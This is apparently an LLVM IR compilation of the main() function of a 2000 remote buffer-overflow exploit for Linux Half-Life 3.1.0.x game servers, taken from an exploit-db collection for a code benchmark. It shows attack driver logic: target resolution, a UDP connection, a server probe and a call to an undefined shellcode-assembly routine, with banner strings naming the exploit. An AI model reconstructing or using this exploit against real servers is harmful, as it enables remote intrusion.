; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_181.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_181.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [59 x i8] c".  half-life 3.1.0.x remote buffer-overflow for linux x86\0A\00", align 1
@.str.1 = private unnamed_addr constant [42 x i8] c".  (c)2000, Tamandua Sekure Laboratories\0A\00", align 1
@.str.2 = private unnamed_addr constant [47 x i8] c".  Authors: Thiago Zaninotti & Gustavo Scotti\0A\00", align 1
@.str.3 = private unnamed_addr constant [40 x i8] c":  port not found, using default 27015\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"host not found!\0A\00", align 1
@.str.5 = private unnamed_addr constant [65 x i8] c"this is not a linux server. Make a shellcode to it and have fun\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i64], align 16
  %12 = alloca i64*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64* null, i64** %12, align 8
  %13 = call i32 @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.2, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %20

18:                                               ; preds = %2
  %19 = call i32 (...) @usage()
  br label %20

20:                                               ; preds = %18, %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i64 @strchr(i8* %23, i8 signext 58)
  %25 = inttoptr i64 %24 to i64*
  store i64* %25, i64** %12, align 8
  %26 = load i64*, i64** %12, align 8
  %27 = icmp ne i64* %26, null
  br i1 %27, label %28, label %34

28:                                               ; preds = %20
  %29 = load i64*, i64** %12, align 8
  store i64 0, i64* %29, align 8
  %30 = load i64*, i64** %12, align 8
  %31 = getelementptr inbounds i64, i64* %30, i32 1
  store i64* %31, i64** %12, align 8
  %32 = load i64*, i64** %12, align 8
  %33 = call i32 @atoi(i64* %32)
  store i32 %33, i32* %8, align 4
  br label %36

34:                                               ; preds = %20
  %35 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0))
  store i32 27015, i32* %8, align 4
  br label %36

36:                                               ; preds = %34, %28
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @dns2ip(i8* %39)
  store i32 %40, i32* %6, align 4
  %41 = load i32, i32* %6, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %46

43:                                               ; preds = %36
  %44 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  %45 = call i32 @exit(i32 0) #3
  unreachable

46:                                               ; preds = %36
  %47 = load i32, i32* %6, align 4
  %48 = load i32, i32* %8, align 4
  %49 = call i32 @udp_connect(i32 %47, i32 %48)
  store i32 %49, i32* %9, align 4
  %50 = load i32, i32* %9, align 4
  %51 = getelementptr inbounds [256 x i64], [256 x i64]* %11, i64 0, i64 0
  %52 = call i32 @retrieve_local_info(i32 %50, i64* %51)
  store i32 %52, i32* %7, align 4
  %53 = load i32, i32* %9, align 4
  %54 = load i32, i32* %6, align 4
  %55 = load i32, i32* %8, align 4
  %56 = call i32 @get_server_info(i32 %53, i32 %54, i32 %55)
  %57 = icmp ne i32 %56, 1
  br i1 %57, label %58, label %61

58:                                               ; preds = %46
  %59 = call i32 @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.5, i64 0, i64 0))
  %60 = call i32 @exit(i32 0) #3
  unreachable

61:                                               ; preds = %46
  %62 = load i32, i32* %9, align 4
  %63 = load i32, i32* %6, align 4
  %64 = load i32, i32* %8, align 4
  %65 = load i32, i32* %7, align 4
  %66 = getelementptr inbounds [256 x i64], [256 x i64]* %11, i64 0, i64 0
  %67 = call i32 @assembly_shell_code(i32 %62, i32 %63, i32 %64, i32 %65, i64* %66)
  %68 = load i32, i32* %3, align 4
  ret i32 %68
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @usage(...) #1

declare dso_local i64 @strchr(i8*, i8 signext) #1

declare dso_local i32 @atoi(i64*) #1

declare dso_local i32 @dns2ip(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @udp_connect(i32, i32) #1

declare dso_local i32 @retrieve_local_info(i32, i64*) #1

declare dso_local i32 @get_server_info(i32, i32, i32) #1

declare dso_local i32 @assembly_shell_code(i32, i32, i32, i32, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
